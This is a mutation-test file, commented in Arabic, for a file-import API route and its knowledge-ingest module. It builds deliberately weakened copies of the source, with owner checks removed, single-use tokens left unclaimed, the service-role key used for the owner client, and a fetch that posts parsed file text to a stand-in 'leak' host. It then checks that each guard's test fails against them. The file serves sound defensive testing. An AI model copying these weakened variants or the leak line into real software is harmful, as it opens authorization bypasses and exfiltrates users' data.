// @vitest-environment node
/**
 * براهين التحمير (المادة ٣٠) لمسار الاستيراد وإدخاله: كل حارسٍ يُثبَت أنه **يحمرّ** حين يُضعَّف عمدًا.
 *
 * الطريقة (كما في `guards.mutation.server.test.ts`): لكل حارس «بطارية» هجمات تُشغَّل أولًا على الكود
 * الحقيقي (يجب أن تمرّ)، ثم على **نسخةٍ مُضعَّفة** من الملف نفسه مولَّدة وقت التشغيل بتبديل نصٍّ واحد
 * (المرساة يجب أن تظهر مرّةً واحدة بالضبط وإلا فشل الاختبار بصوتٍ عالٍ إن تغيّر المصدر). المطلوب أن
 * تُخطئ البطارية في النسخة المُضعَّفة — أي أن الهجوم المزروع يمرّ فعلًا حين يغيب الحارس.
 *
 * النسخ المُضعَّفة تُكتب في `<جذر المستودع>/.mutant-scratch/` (خارج `src/` كي لا تكسر globSync الحرّاس
 * بسباق ENOENT) بالبادئة `__routemutant_` (غير بادئة ملف الحرّاس الآخر، فلا يمسح أحد الملفَّين نسخ
 * الآخر وهما يعملان معًا) وتُحذف فور استيرادها. لا يستورد كودُ الإنتاج منها.
 */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { FINN_IMPORT_LIMITS } from "./contract";
import { FakeDb } from "./fake-db.test-support";
import { fileSha256Hex } from "./import-token.server";
import {
  CRON_SECRET,
  OTHER,
  OWNER,
  PLANTED,
  buildRequest,
  captureLogs,
  handlersOf,
  jsonOf,
  jwtFor,
  xlsxBytes,
  type Handlers,
} from "./import-route.test-support";
import {
  call,
  previewToken,
  resetSim,
  signFor,
  sim,
  spend,
  stubApprovalSecret,
} from "./import-route.harness.test-support";
import { knowledgeRevisionHash } from "@/lib/sadeed/knowledge-ingest-core";
import { setFinnDenyClockForTests } from "@/lib/finn-agent/owner-gate.server";
import { createMutantScratch, mutantFilesInsideSrc } from "./mutant-scratch.test-support";

const DIR = path.dirname(fileURLToPath(import.meta.url));
const ROUTE_FILE = path.resolve(DIR, "../../routes/api/finn/import.ts");
const INGEST_FILE = path.resolve(DIR, "ingest.server.ts");
const scratch = createMutantScratch("__routemutant_");

const clientCalls = vi.hoisted(
  () => [] as Array<{ url: string; key: string; options: Record<string, unknown> }>,
);
vi.mock("@supabase/supabase-js", async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  createClient: (url: string, key: string, options: Record<string, unknown>) => {
    clientCalls.push({ url, key, options });
    return { __fake: true };
  },
}));
vi.mock("@/lib/governance/rate-limit.server", async (importOriginal) =>
  (await import("./import-route.harness.test-support")).rateLimitModule(
    importOriginal as () => Promise<Record<string, unknown>>,
  ),
);
vi.mock("@/lib/hook-auth.server", async () =>
  (await import("./import-route.harness.test-support")).hookAuthModule(),
);
vi.mock("@/integrations/supabase/client.server", async () =>
  (await import("./import-route.harness.test-support")).clientServerModule(),
);
vi.mock("@/lib/finn-import/ingest.server", async () =>
  (await import("./import-route.harness.test-support")).ingestModule(),
);

// ── أداة التضعيف ─────────────────────────────────────────────────────────────
type Edit = [from: string, to: string];

/** يكتب نسخةً مُضعَّفة في مجلّد المسودّة (خارج src) ويستورد منها ثم يحذفها. يسلّم مسارها المطلق. */
async function withMutant<T>(
  sourcePath: string,
  edits: Edit[],
  run: (mutantPath: string) => Promise<T>,
): Promise<T> {
  const source = fs.readFileSync(sourcePath, "utf8");
  let out = source;
  for (const [from, to] of edits) {
    const found = out.split(from).length - 1;
    if (found !== 1) {
      throw new Error(
        `مرساة التضعيف يجب أن تظهر مرّةً واحدة (وُجدت ${found}): ${from.slice(0, 90)}`,
      );
    }
    out = out.replace(from, () => to);
  }
  if (out === source) throw new Error("التضعيف لم يغيّر شيئًا");
  return scratch.withMutantFile(sourcePath, out, run);
}

beforeAll(() => scratch.cleanStale());
afterAll(() => scratch.cleanStale());

/** بيئة نظيفة لكل تشغيل بطارية (الحقيقي ثم المُضعَّف على حالٍ واحدة). */
function arm() {
  resetSim();
  clientCalls.length = 0;
  vi.unstubAllEnvs();
  vi.stubEnv("FINN_OWNER_USER_IDS", OWNER);
  vi.stubEnv("SADEED_AI_DISABLED", "");
  stubApprovalSecret(vi);
}

beforeEach(() => {
  arm();
  setFinnDenyClockForTests({ now: () => 0, sleep: async () => undefined });
  // أي نداء شبكة من المسار يُعدّ ويُفشل: بدونه يبقى `spend().fetch` صفرًا دائمًا فلا يُحمّر مُضعَّفٌ يستدعي fetch.
  vi.stubGlobal(
    "fetch",
    vi.fn(async () => {
      sim.fetchCalls++;
      throw new Error("لا شبكة في هذا الاختبار");
    }),
  );
});
afterEach(() => {
  setFinnDenyClockForTests(null);
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("أداة التضعيف نفسها", () => {
  it("ترفض مرساةً غائبة أو مكرَّرة (فلا يمرّ تضعيفٌ وهميّ)", async () => {
    await expect(
      withMutant(ROUTE_FILE, [["نص غير موجود إطلاقًا ٧٧٣١", "x"]], async () => 0),
    ).rejects.toThrow(/وُجدت 0/);
    await expect(withMutant(ROUTE_FILE, [["const", "let"]], async () => 0)).rejects.toThrow(
      /وُجدت [2-9]/,
    );
  });

  it("لا تترك ملفات مُضعَّفة خلفها", async () => {
    await withMutant(
      ROUTE_FILE,
      [["const NO_STORE_HEADERS", "const NO_STORE_HEADERS_2"]],
      async () => 0,
    );
    expect(scratch.leftovers()).toEqual([]);
    expect(mutantFilesInsideSrc()).toEqual([]);
  });
});

// ═══ ١) المسار: بطاريات الهجوم ═══════════════════════════════════════════════
const XLSX_FILE = () => ({ name: "data.xlsx", bytes: xlsxBytes() });
const NONE = { rate: 0, claim: 0, prepare: 0, ingest: 0, fetch: 0 };

async function executeWith(h: Handlers, token?: string) {
  const file = XLSX_FILE();
  const t = token ?? (await previewToken(h, file));
  return call(h, buildRequest({ action: "execute", token: t, file }));
}

const ROUTE_BATTERIES: Record<string, (h: Handlers) => Promise<void>> = {
  ownerFirst: async (h) => {
    arm();
    sim.verifyUser = OTHER;
    const res = await call(h, buildRequest());
    expect(res.status).toBe(404);
    expect(spend()).toEqual(NONE);
  },
  ownerGateOnExecute: async (h) => {
    arm();
    const file = XLSX_FILE();
    const token = await signFor({
      userId: OWNER,
      fileSha256: fileSha256Hex(file.bytes),
      parts: 1,
      rows: 2,
    });
    sim.verifyUser = OTHER;
    const res = await call(
      h,
      buildRequest({ action: "execute", token, file, bearer: jwtFor(OTHER) }),
    );
    expect(res.status).toBe(404);
    expect(spend()).toEqual(NONE);
    expect(sim.claimBuckets.size).toBe(0);
  },
  emptyFileRejected: async (h) => {
    arm();
    const res = await call(
      h,
      buildRequest({ file: { name: "n.json", bytes: '[{"a":null},{"a":null}]' } }),
    );
    expect(res.status).toBe(422);
    const body = await jsonOf(res);
    expect(body.error).toBe("empty");
    expect(body).not.toHaveProperty("token");
    expect(spend()).toEqual({ ...NONE, rate: 1 });
  },
  killSwitchBeforeBody: async (h) => {
    arm();
    vi.stubEnv("SADEED_AI_DISABLED", "1");
    const res = await call(h, buildRequest());
    expect(res.status).toBe(503);
    expect((await jsonOf(res)).error).toBe("ai_disabled");
    expect(spend()).toEqual(NONE);
  },
  killSwitchHiddenFromNonOwner: async (h) => {
    arm();
    vi.stubEnv("SADEED_AI_DISABLED", "1");
    const res = await call(h, buildRequest({ bearer: jwtFor(OTHER) }));
    expect(res.status).toBe(404);
  },
  anyMethodIs404: async (h) => {
    arm();
    const res = await h.ANY({ request: new Request("http://local/api/finn/import") });
    expect(res.status).toBe(404);
    expect(await res.text()).toBe('{"error":"not_found"}');
  },
  contentTypeChecked: async (h) => {
    arm();
    const res = await call(h, buildRequest({ rawBody: "{}", contentType: "application/json" }));
    expect(res.status).toBe(415);
  },
  headerSizeBeforeBody: async (h) => {
    arm();
    const res = await call(
      h,
      buildRequest({
        headers: { "content-length": String(FINN_IMPORT_LIMITS.maxFileBytes + 64 * 1024 + 1) },
      }),
    );
    expect(res.status).toBe(413);
    expect(spend().rate).toBe(0);
  },
  oneFileOnly: async (h) => {
    arm();
    const res = await call(h, buildRequest({ secondFile: { name: "b.csv", bytes: "a\n1" } }));
    expect(res.status).toBe(400);
  },
  actionValidated: async (h) => {
    arm();
    const res = await call(h, buildRequest({ action: "delete" }));
    expect(res.status).toBe(400);
    expect(spend().ingest).toBe(0);
  },
  realSizeBeforeLimit: async (h) => {
    arm();
    const big = new Uint8Array(FINN_IMPORT_LIMITS.maxFileBytes + 1).fill(97);
    const res = await call(
      h,
      buildRequest({ file: { name: "big.csv", bytes: big }, headers: { "content-length": "100" } }),
    );
    expect(res.status).toBe(413);
    expect(spend().rate).toBe(0);
  },
  limiterThrowsClosed: async (h) => {
    arm();
    sim.rateThrows = true;
    const res = await call(h, buildRequest());
    expect(res.status).toBe(503);
    expect((await jsonOf(res)).error).toBe("unavailable");
    expect(spend().ingest).toBe(0);
  },
  limiterUnavailableClosed: async (h) => {
    arm();
    sim.rate = { allowed: false, unavailable: true };
    const res = await call(h, buildRequest());
    expect(res.status).toBe(503);
    expect((await jsonOf(res)).error).toBe("unavailable");
  },
  previewWritesNothing: async (h) => {
    arm();
    const res = await call(h, buildRequest());
    expect(res.status).toBe(200);
    expect(spend()).toEqual({ ...NONE, rate: 1 });
  },
  noNetworkOnPreview: async (h) => {
    arm();
    const res = await call(h, buildRequest());
    expect(res.status).toBe(200);
    expect(spend().fetch).toBe(0);
  },
  fileNameMasked: async (h) => {
    arm();
    const res = await call(
      h,
      buildRequest({ file: { name: `ملف-${PLANTED.phone}.xlsx`, bytes: xlsxBytes() } }),
    );
    expect(res.status).toBe(200);
    expect(await res.text()).not.toContain(PLANTED.phone);
  },
  singleUseToken: async (h) => {
    arm();
    const file = XLSX_FILE();
    const token = await previewToken(h, file);
    const run = () => call(h, buildRequest({ action: "execute", token, file }));
    expect((await run()).status).toBe(200);
    const replay = await run();
    expect(replay.status).toBe(409);
    expect(sim.ingestCalls).toHaveLength(1);
  },
  countsMustMatchPreview: async (h) => {
    arm();
    const file = XLSX_FILE();
    const token = await signFor({
      userId: OWNER,
      fileSha256: fileSha256Hex(file.bytes),
      parts: 5,
      rows: 2,
    });
    const res = await call(h, buildRequest({ action: "execute", token, file }));
    expect(res.status).toBe(422);
    expect((await jsonOf(res)).error).toBe("file_changed");
    expect(spend().ingest).toBe(0);
  },
  misconfigDoesNotBurnToken: async (h) => {
    arm();
    const file = XLSX_FILE();
    const token = await previewToken(h, file);
    sim.prepareOk = false;
    const res = await call(h, buildRequest({ action: "execute", token, file }));
    expect(res.status).toBe(503);
    expect(spend().claim).toBe(0);
  },
  documentsCountInsertedOnly: async (h) => {
    arm();
    sim.ingestOutcome = () => ({
      total: 4,
      queued: 2,
      deduped: 2,
      failed: 0,
      parts: ["queued", "queued", "deduped", "deduped"],
    });
    const res = await executeWith(h);
    expect(res.status).toBe(200);
    expect((await jsonOf(res)).documents).toBe(2);
  },
  partialIsNotDone: async (h) => {
    arm();
    sim.ingestOutcome = () => ({
      total: 2,
      queued: 1,
      deduped: 0,
      failed: 1,
      parts: ["queued", "failed"],
    });
    const res = await executeWith(h);
    expect(res.status).toBe(502);
    const body = await jsonOf(res);
    expect(body.ok).toBe(false);
    expect(body.partial).toMatchObject({ queued: 1, failed: 1 });
  },
  allDedupedIsNotDone: async (h) => {
    arm();
    sim.ingestOutcome = () => ({ total: 1, queued: 0, deduped: 1, failed: 0, parts: ["deduped"] });
    const res = await executeWith(h);
    expect(res.status).toBe(409);
    expect((await jsonOf(res)).ok).toBe(false);
  },
  noErrorTextInLog: async (h) => {
    arm();
    sim.ingestThrows = `${PLANTED.error} ${PLANTED.cell}`;
    const { result, output } = await captureLogs(() => executeWith(h));
    expect(result.status).toBe(503);
    expect(output).not.toContain(PLANTED.error);
    expect(output).not.toContain(PLANTED.cell);
  },
};

const ROUTE_MUTANTS: Array<{ guard: keyof typeof ROUTE_BATTERIES; edits: Edit[]; note: string }> = [
  {
    guard: "ownerFirst",
    note: "غير المالك يمرّ",
    edits: [["if (!owner.ok) return finnNotFoundResponse();", ""]],
  },
  {
    guard: "ownerGateOnExecute",
    note: "بوّابة المالك مُسقَطة للتنفيذ وحده: غير المالك برمزٍ صالح ينفّذ بهوية المالك",
    edits: [
      [
        "if (!owner.ok) return finnNotFoundResponse();",
        `if (!owner.ok) {
          const peek = await request.clone().formData().catch(() => null);
          if (peek?.get("action") !== "execute") return finnNotFoundResponse();
          return handlePost(request, "${OWNER}");
        }`,
      ],
    ],
  },
  {
    guard: "emptyFileRejected",
    note: "ملفٌّ كل صفوفه فارغة يمرّ معاينةً بصفر وثائق ورمزٍ موقَّع",
    edits: [['if (built.parts.length === 0) return failure("empty");', ""]],
  },
  {
    guard: "killSwitchBeforeBody",
    note: "مفتاح الإيقاف لا يُردّ",
    edits: [["if (off) return off;", ""]],
  },
  {
    guard: "killSwitchHiddenFromNonOwner",
    note: "مفتاح الإيقاف قبل بوّابة المالك فيكشف المسار",
    edits: [
      [
        "const owner = await resolveFinnOwner(request);",
        'const early = aiDisabledResponse("finn");\n        if (early) return early;\n        const owner = await resolveFinnOwner(request);',
      ],
    ],
  },
  {
    guard: "anyMethodIs404",
    note: "طريقة غير POST تردّ غير الـ404",
    edits: [
      [
        "ANY: async () => finnNotFoundResponse(),",
        'ANY: async () => new Response("spa", { status: 200 }),',
      ],
    ],
  },
  {
    guard: "contentTypeChecked",
    note: "لا فحص multipart",
    edits: [
      ['if (!contentType.includes("multipart/form-data")) return failure("unsupported_type");', ""],
    ],
  },
  {
    guard: "headerSizeBeforeBody",
    note: "لا فحص Content-Length",
    edits: [
      [
        "if (declared > FINN_IMPORT_LIMITS.maxFileBytes + MULTIPART_OVERHEAD_BYTES) {",
        "if (false) {",
      ],
    ],
  },
  {
    guard: "oneFileOnly",
    note: "يقبل ملفين",
    edits: [
      [
        'if (files.length !== 1 || typeof files[0] === "string") return null;',
        'if (files.length < 1 || typeof files[0] === "string") return null;',
      ],
    ],
  },
  {
    guard: "actionValidated",
    note: "فعلٌ غير صالح يُعامَل كتنفيذ",
    edits: [['if (action !== "preview" && action !== "execute") return null;', ""]],
  },
  {
    guard: "realSizeBeforeLimit",
    note: "لا فحص للحجم الفعلي قبل الحدّ",
    edits: [['if (file.size > FINN_IMPORT_LIMITS.maxFileBytes) return failure("too_large");', ""]],
  },
  {
    guard: "limiterThrowsClosed",
    note: "الحدّ يفتح عند الاستثناء",
    edits: [["rate = { allowed: false, unavailable: true };", "rate = { allowed: true };"]],
  },
  {
    guard: "limiterUnavailableClosed",
    note: "عدم توفّر المحدِّد لا يُعامَل فشلًا مغلقًا",
    edits: [["if (rate.unavailable) {", "if (false) {"]],
  },
  {
    guard: "previewWritesNothing",
    note: "المعاينة تُدخل",
    edits: [
      [
        "return respond(200, preview);",
        "const rt = prepareIngest(request);\n    if (rt.ok) {\n      await ingestKnowledgeParts(\n        built.parts.map((p) => ({ title: p.title, text: p.text })),\n        { supabase: rt.supabase, userId, origin: rt.origin, hookSecret: rt.hookSecret },\n      );\n    }\n    return respond(200, preview);",
      ],
    ],
  },
  {
    guard: "noNetworkOnPreview",
    note: "المعاينة تنادي الشبكة (fetch خام) بعد التحليل",
    edits: [
      [
        "return respond(200, preview);",
        'await fetch("https://example.invalid/leak", { method: "POST", body: built.parts[0].text }).catch(() => undefined);\n    return respond(200, preview);',
      ],
    ],
  },
  {
    guard: "fileNameMasked",
    note: "اسم الملف يعود دون حجب",
    edits: [
      [
        'return maskPii(cleanCell(base, 120).text).text || "ملف";',
        'return cleanCell(base, 120).text || "ملف";',
      ],
    ],
  },
  {
    guard: "singleUseToken",
    note: "لا استهلاك للرمز",
    edits: [
      [
        "const claim = await claimImportToken({ nonce: verified.nonce, userId });\n  if (!claim.ok) return failure(claim.error);",
        "",
      ],
    ],
  },
  {
    guard: "countsMustMatchPreview",
    note: "لا مطابقة بين المعاينة وما أُعيد حسابه",
    edits: [
      [
        "if (!verified || verified.parts !== built.parts.length || verified.rows !== built.rows_loaded) {",
        "if (!verified) {",
      ],
    ],
  },
  {
    guard: "misconfigDoesNotBurnToken",
    note: "الرمز يُستهلك قبل فحص تهيئة الإدخال",
    edits: [
      ['if (!runtime.ok) return failure("unavailable", { retryAfter: RETRY_INGEST_S });', ""],
      [
        "const outcome = await ingestKnowledgeParts(",
        'if (!runtime.ok) return failure("unavailable", { retryAfter: RETRY_INGEST_S });\n  const outcome = await ingestKnowledgeParts(',
      ],
    ],
  },
  {
    guard: "documentsCountInsertedOnly",
    note: "documents يعدّ المكرَّر أيضًا",
    edits: [["documents: outcome.queued,", "documents: outcome.total,"]],
  },
  {
    guard: "partialIsNotDone",
    note: "الجزئي يُروى كفشل كلّي بلا تفصيل",
    edits: [
      ["if (outcome.failed > 0 && (outcome.queued > 0 || outcome.deduped > 0)) {", "if (false) {"],
    ],
  },
  {
    guard: "allDedupedIsNotDone",
    note: "كلّه مكرَّر يُروى «تمّ»",
    edits: [["if (outcome.queued === 0) {", "if (false) {"]],
  },
  {
    guard: "noErrorTextInLog",
    note: "نصّ الاستثناء يُسجَّل",
    edits: [
      [
        "} catch {\n    // استثناءٌ غير متوقَّع",
        "} catch (error) {\n    console.error(error);\n    // استثناءٌ غير متوقَّع",
      ],
    ],
  },
];

describe("المسار: كل حارسٍ ينجح على الحقيقي ويحمرّ على المُضعَّف", () => {
  it("كل حارس له مُضعَّفٌ واحد على الأقل، وكل بطارية لها حارس (المادة ٣٠: لا قوائم ناقصة)", () => {
    expect(new Set(ROUTE_MUTANTS.map((m) => m.guard))).toEqual(
      new Set(Object.keys(ROUTE_BATTERIES)),
    );
    expect(ROUTE_MUTANTS.length).toBeGreaterThanOrEqual(20);
  });

  it.each(ROUTE_MUTANTS.map((m) => [m.guard, m] as const))("%s", async (_name, mutant) => {
    const battery = ROUTE_BATTERIES[mutant.guard];
    // الحقيقي يمرّ.
    await battery(await handlersOf());
    // المُضعَّف يجب أن يُخطئ البطارية.
    const verdict = await withMutant(ROUTE_FILE, mutant.edits, async (file) => {
      const handlers = await handlersOf(file);
      try {
        await battery(handlers);
        return "survived" as const;
      } catch {
        return "caught" as const;
      }
    });
    expect(verdict, `المُضعَّف نجا (${mutant.note}): الحارس لا يحمرّ`).toBe("caught");
  });
});

// ═══ ٢) الإدخال: بطاريات الهجوم ═══════════════════════════════════════════════
type IngestModule = typeof import("./ingest.server");
const USER = OWNER;
const TEXT = "## الورقة: البيانات\n\nالاسم: خلية-أ";
const PART = { title: "[FNN] data.xlsx — البيانات", text: TEXT };

function hookFetch(status: number | ((db: FakeDb) => number), db?: FakeDb) {
  const calls: Array<{ secret: string | null }> = [];
  const impl = (async (_url: string, init: RequestInit) => {
    calls.push({ secret: new Headers(init.headers).get("x-cron-secret") });
    const s = typeof status === "function" ? status(db as FakeDb) : status;
    return new Response("{}", { status: s });
  }) as unknown as typeof fetch;
  return { calls, impl };
}

const depsFor = (db: FakeDb, fetchImpl: typeof fetch) => ({
  supabase: db.client() as never,
  userId: USER,
  origin: "https://app.example.test",
  hookSecret: CRON_SECRET,
  fetchImpl,
  settleMs: 25,
});

const INGEST_BATTERIES: Record<string, (m: IngestModule) => Promise<void>> = {
  dedupeSameOwner: async (m) => {
    const db = new FakeDb();
    db.seed({ user_id: USER, status: "ready", revision_hash: await knowledgeRevisionHash(TEXT) });
    const hook = hookFetch(200);
    const result = await m.ingestKnowledgeParts([PART], depsFor(db, hook.impl));
    expect(result.parts).toEqual(["deduped"]);
    expect(db.rows).toHaveLength(1);
    expect(hook.calls).toHaveLength(0);
  },
  dedupeScopedToOwner: async (m) => {
    const db = new FakeDb();
    db.seed({
      user_id: OTHER,
      status: "ready",
      revision_hash: await knowledgeRevisionHash(TEXT),
    });
    const result = await m.ingestKnowledgeParts([PART], depsFor(db, hookFetch(200).impl));
    expect(result.parts).toEqual(["queued"]);
  },
  dedupeScopedToOrg: async (m) => {
    const db = new FakeDb();
    db.seed({
      user_id: USER,
      status: "ready",
      revision_hash: await knowledgeRevisionHash(TEXT),
      org_id: "00000000-0000-4000-8000-0000000000bb",
    });
    const result = await m.ingestKnowledgeParts([PART], depsFor(db, hookFetch(200).impl));
    expect(result.parts).toEqual(["queued"]);
  },
  immediateHookFailureCounted: async (m) => {
    const db = new FakeDb();
    const result = await m.ingestKnowledgeParts([PART], depsFor(db, hookFetch(401).impl));
    expect(result).toMatchObject({ queued: 0, failed: 1 });
  },
  neverOverwriteHookState: async (m) => {
    const db = new FakeDb();
    const hook = hookFetch((d) => {
      d.rows[0].status = "processing";
      return 502;
    }, db);
    await m.ingestKnowledgeParts([PART], depsFor(db, hook.impl));
    expect(db.rows[0].status).toBe("processing");
  },
  noTextInStoredReason: async (m) => {
    const db = new FakeDb();
    await m.ingestKnowledgeParts([PART], depsFor(db, hookFetch(401).impl));
    expect(db.rows[0].status).toBe("failed");
    expect(String(db.rows[0].error)).not.toContain("خلية-أ");
    expect(String(db.rows[0].error)).not.toContain("data.xlsx");
    expect(String(db.rows[0].error)).toMatch(/index_start_failed/);
  },
  hookGetsServerSecret: async (m) => {
    const db = new FakeDb();
    const hook = hookFetch(200);
    await m.ingestKnowledgeParts([PART], depsFor(db, hook.impl));
    expect(hook.calls[0].secret).toBe(CRON_SECRET);
  },
  ownerClientNeverServiceRole: async (m) => {
    clientCalls.length = 0;
    const runtime = m.prepareIngest(
      new Request("https://edge.example.test/x", {
        method: "POST",
        headers: { authorization: "Bearer owner-token-123" },
      }),
      {
        CRON_HOOK_SECRET: CRON_SECRET,
        SUPABASE_URL: "https://proj.supabase.test",
        SUPABASE_PUBLISHABLE_KEY: "anon-key-planted",
        SUPABASE_SERVICE_ROLE_KEY: "service-role-planted-NEVER",
      },
    );
    expect(runtime.ok).toBe(true);
    expect(clientCalls[0].key).toBe("anon-key-planted");
    expect(JSON.stringify(clientCalls)).not.toContain("service-role-planted-NEVER");
  },
};

const INGEST_MUTANTS: Array<{ guard: keyof typeof INGEST_BATTERIES; edits: Edit[]; note: string }> =
  [
    {
      guard: "dedupeSameOwner",
      note: "لا كشف للتكرار",
      edits: [
        [
          "duplicateId = pickDuplicateDocument(found.data ?? [], Date.now(), doc)?.id ?? null;",
          "duplicateId = null;",
        ],
      ],
    },
    {
      guard: "dedupeScopedToOwner",
      note: "التكرار عابر للمالكين",
      edits: [['      .eq("user_id", userId)\n', ""]],
    },
    {
      guard: "dedupeScopedToOrg",
      note: "التكرار عابر للمؤسسات",
      edits: [['      .eq("org_id", doc.org_id)\n', ""]],
    },
    {
      guard: "immediateHookFailureCounted",
      note: "فشل الخطّاف الفوري يُحسب نجاحًا",
      edits: [['      states[i] = "failed";\n', ""]],
    },
    {
      guard: "neverOverwriteHookState",
      note: "يُكتب فوق حالة الخطّاف",
      edits: [['if (onlyWhenPending) query = query.eq("status", "pending");', ""]],
    },
    {
      guard: "noTextInStoredReason",
      note: "نصّ الجزء يُكتب في عمود error",
      edits: [
        [
          "await markFailed(deps, s.documentId, REASON_INDEX_START, true);",
          "await markFailed(deps, s.documentId, `hook_${status}: ${s.text}`, true);",
        ],
      ],
    },
    {
      guard: "hookGetsServerSecret",
      note: "الخطّاف بلا سرّ الخادم",
      edits: [['"x-cron-secret": deps.hookSecret', '"x-cron-secret": ""']],
    },
    {
      guard: "ownerClientNeverServiceRole",
      note: "عميل المالك يُبنى بمفتاح الخدمة",
      edits: [
        [
          "    env.SUPABASE_ANON_KEY ||",
          "    env.SUPABASE_SERVICE_ROLE_KEY ||\n    env.SUPABASE_ANON_KEY ||",
        ],
      ],
    },
  ];

describe("الإدخال: كل حارسٍ ينجح على الحقيقي ويحمرّ على المُضعَّف", () => {
  it("كل حارس له مُضعَّف وكل بطارية لها حارس", () => {
    expect(new Set(INGEST_MUTANTS.map((m) => m.guard))).toEqual(
      new Set(Object.keys(INGEST_BATTERIES)),
    );
  });

  it.each(INGEST_MUTANTS.map((m) => [m.guard, m] as const))("%s", async (_name, mutant) => {
    const battery = INGEST_BATTERIES[mutant.guard];
    const real = await vi.importActual<IngestModule>("./ingest.server");
    await battery(real);
    const verdict = await withMutant(INGEST_FILE, mutant.edits, async (file) => {
      const mod = (await import(/* @vite-ignore */ file)) as IngestModule;
      try {
        await battery(mod);
        return "survived" as const;
      } catch {
        return "caught" as const;
      }
    });
    expect(verdict, `المُضعَّف نجا (${mutant.note}): الحارس لا يحمرّ`).toBe("caught");
  });
});
